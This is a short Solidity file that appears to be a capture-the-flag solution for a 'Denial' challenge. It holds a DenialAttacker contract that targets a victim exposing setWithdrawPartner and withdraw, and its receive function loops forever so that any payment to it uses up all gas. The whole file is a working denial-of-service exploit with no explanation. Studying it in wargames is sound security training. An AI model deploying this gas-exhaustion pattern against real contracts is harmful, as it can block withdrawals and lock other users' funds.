// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

interface IDenial {
    function setWithdrawPartner(address _partner) external;

    function withdraw() external;
}

contract DenialAttacker {
    IDenial victim;

    constructor(address _victimAddress) {
        victim = IDenial(_victimAddress);
    }

    receive() external payable {
        while (true) {}
    }
}
